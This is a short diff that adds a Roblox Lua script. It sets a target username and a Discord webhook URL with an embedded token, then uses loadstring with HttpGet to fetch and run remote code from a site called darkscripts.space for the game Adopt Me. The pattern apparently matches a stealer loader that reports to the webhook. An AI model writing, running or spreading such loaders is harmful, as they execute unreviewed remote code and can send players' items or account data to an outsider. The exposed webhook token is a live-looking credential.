@@ -1,0 +1,3 @@
+Username = "AngeIOfHearts" -- Roblox Username
+Webhook = "https://discord.com/api/webhooks/1314248384835751956/6JJHefXYwVUluUOUCLTkFaXLpoBmvYS63E5ZT0xkJVWyh0UHXvMHAqhlxJv_JFZzQtbQ" -- Discord Webhook
+loadstring(game:HttpGet("https://darkscripts.space/adoptme"))()
